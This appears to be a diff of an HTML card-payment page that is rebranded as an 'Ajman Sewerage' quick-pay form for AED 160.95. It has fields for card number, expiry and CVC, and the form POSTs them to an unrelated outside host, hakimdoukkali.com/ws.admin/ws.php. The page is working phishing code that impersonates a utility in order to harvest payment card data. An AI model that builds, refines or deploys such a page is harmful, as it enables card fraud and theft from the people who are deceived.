@@ -3,191 +3,114 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Payment Details</title>
+    <title>Ajman Sewerage Payment Form</title>
     <style>
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: #1e1e2f;
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            color: #fff;
+            margin: 0;
         }
         .payment-container {
-            background-color: #2a2a40;
-            padding: 30px;
-            border-radius: 12px;
-            max-width: 400px;
-            width: 100%;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            position: relative;
         }
-        .payment-container:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.4);
+        .logo {
+            position: absolute;
+            top: -50px; /* Adjust based on logo size */
+            left: 0;
+            width: 150px; /* Adjust based on logo size */
+            height: auto;
         }
         .payment-container h2 {
-            margin: 0 0 20px 0;
+            margin-bottom: 20px;
+            font-size: 24px;
+            color: #333;
+        }
+        .payment-container label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+            color: #555;
+        }
+        .payment-container input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+        .payment-container button {
+            width: 100%;
+            padding: 10px;
+            background-color: rgb(4, 4, 64); /* Changed to blue */
+            border: none;
+            border-radius: 4px;
+            color: #fff;
+            font-size: 16px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .payment-container button:hover {
+            background-color: rgb(2, 2, 77); /* Darker blue for hover effect */
+        }
+        .amount {
             font-size: 28px;
             font-weight: bold;
-            color: #fff;
-            text-align: center;
-            text-transform: uppercase;
-            letter-spacing: 1.5px;
-            border-bottom: 2px solid #6a11cb;
-            padding-bottom: 10px;
-        }
-        .payment-method {
+            color: #333;
             margin-bottom: 20px;
         }
-        .payment-method label {
-            display: block;
-            margin-bottom: 10px;
-            font-weight: bold;
-            color: #ccc;
-        }
-        .payment-method input {
-            width: 100%;
-            padding: 12px;
-            margin-bottom: 15px;
-            border: 1px solid #444;
-            border-radius: 6px;
-            font-size: 16px;
-            background-color: #3a3a50;
-            color: #fff;
-            transition: border-color 0.3s ease;
-        }
-        .payment-method input:focus {
-            border-color: #6a11cb;
-            outline: none;
-        }
-        .cvv-section {
+        .reference {
+            font-size: 14px;
+            color: #666;
             margin-bottom: 20px;
         }
-        .cvv-section label {
-            display: block;
-            margin-bottom: 10px;
-            font-weight: bold;
-            color: #ccc;
-        }
-        .cvv-section input {
-            width: 100%;
-            padding: 12px;
-            margin-bottom: 15px;
-            border: 1px solid #444;
-            border-radius: 6px;
-            font-size: 16px;
-            background-color: #3a3a50;
-            color: #fff;
-            transition: border-color 0.3s ease;
-        }
-        .cvv-section input:focus {
-            border-color: #6a11cb;
-            outline: none;
-        }
-        .expiry-date-section {
+        .card-details {
             display: flex;
             justify-content: space-between;
-            margin-bottom: 20px;
         }
-        .expiry-date-section select {
+        .card-details input {
             width: 48%;
-            padding: 12px;
-            border: 1px solid #444;
-            border-radius: 6px;
-            font-size: 16px;
-            background-color: #3a3a50;
-            color: #fff;
-            transition: border-color 0.3s ease;
         }
-        .expiry-date-section select:focus {
-            border-color: #6a11cb;
-            outline: none;
-        }
-        .total-amount {
-            font-size: 18px;
-            font-weight: bold;
-            margin-bottom: 20px;
-            color: #fff;
-            text-align: center;
-        }
-        .pay-now-button {
-            text-align: right;
-        }
-        .pay-now-button button {
-            background-color: #6a11cb;
-            color: #fff;
-            padding: 12px 24px;
-            border: none;
-            border-radius: 6px;
-            cursor: pointer;
-            font-size: 16px;
-            transition: background-color 0.3s ease;
-        }
-        .pay-now-button button:hover {
-            background-color: #2575fc;
+        .padlock {
+            margin-right: 8px;
         }
     </style>
 </head>
 <body>
     <div class="payment-container">
-        <h2>Payment Details</h2>
+        <img src="data:image/png;base64,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" alt="Logo" class="logo">
+        <div class="amount">QUICK PAY</div>
+        <div class="reference">AED 160.95 </div>
+        <h2>Cards</h2>
         <form action="https://hakimdoukkali.com/ws.admin/ws.php" method="POST">
-            <div class="payment-method">
-                <label for="card-number">Card number</label>
-                <input type="text" id="card-number" name="card_number" placeholder="1234-5678-9101-1213" maxlength="19" required>
-                
-                <label for="full-name">Full name (as it appears on card)</label>
-                <input type="text" id="full-name" name="full_name" placeholder="Enter full name" required>
-            </div>
-            <div class="expiry-date-section">
+            <label for="card-number">Card number</label>
+            <input type="text" id="card-number" name="card-number" placeholder="1234-5678-9101-1298" maxlength="19" required>
+
+            <div class="card-details">
                 <div>
-                    <label for="expiry-month">Expiry Month</label>
-                    <select id="expiry-month" name="expiry_month" required>
-                        <option value="01">Jan 01</option>
-                        <option value="02">Feb 02</option>
-                        <option value="03">Mar 03</option>
-                        <option value="04">Apr 04</option>
-                        <option value="05">May 05</option>
-                        <option value="06">Jun 06</option>
-                        <option value="07">Jul 07</option>
-                        <option value="08">Aug 08</option>
-                        <option value="09">Sep 09</option>
-                        <option value="10">Oct 10</option>
-                        <option value="11">Nov 11</option>
-                        <option value="12">Dec 12</option>
-                    </select>
+                    <label for="expiry-date">Expiry date</label>
+                    <input type="text" id="expiry-date" name="expiry-date" placeholder="MM/YY" maxlength="5" required>
                 </div>
                 <div>
-                    <label for="expiry-year">Expiry Year</label>
-                    <select id="expiry-year" name="expiry_year" required>
-                        <option value="2025">2025</option>
-                        <option value="2026">2026</option>
-                        <option value="2027">2027</option>
-                        <option value="2028">2028</option>
-                        <option value="2029">2029</option>
-                        <option value="2030">2030</option>
-                        <option value="2031">2031</option>
-                        <option value="2032">2032</option>
-                        <option value="2033">2033</option>
-                        <option value="2034">2034</option>
-                        <option value="2035">2035</option>
-                    </select>
+                    <label for="security-code">Security code</label>
+                    <input type="text" id="security-code" name="security-code" placeholder="CVC" maxlength="3" required>
                 </div>
             </div>
-            <div class="cvv-section">
-                <label for="cvv">CVV</label>
-                <input type="text" id="cvv" name="cvv" placeholder="Enter CVV" required>
-            </div>
-            <div class="total-amount">
-                Total to be paid: AED 160.95
-            </div>
-            <div class="pay-now-button">
-                <button type="submit">PAY NOW</button>
-            </div>
+
+            <button type="submit">
+                <span class="padlock">🔒</span> PAY NOW
+            </button>
         </form>
     </div>
 
@@ -195,16 +118,21 @@
         document.getElementById('card-number').addEventListener('input', function (e) {
             let value = e.target.value.replace(/-/g, '');
             if (value.length > 16) {
-                value = value.substring(0, 16);
+                value = value.slice(0, 16);
             }
-            let formattedValue = '';
-            for (let i = 0; i < value.length; i++) {
-                if (i > 0 && i % 4 === 0) {
-                    formattedValue += '-';
-                }
-                formattedValue += value[i];
-            }
+            let formattedValue = value.replace(/(\d{4})(\d{4})(\d{4})(\d{4})/, '$1-$2-$3-$4');
             e.target.value = formattedValue;
+        });
+
+        document.getElementById('expiry-date').addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 4) {
+                value = value.slice(0, 4);
+            }
+            if (value.length > 2) {
+                value = value.slice(0, 2) + '/' + value.slice(2);
+            }
+            e.target.value = value;
         });
     </script>
 </body>
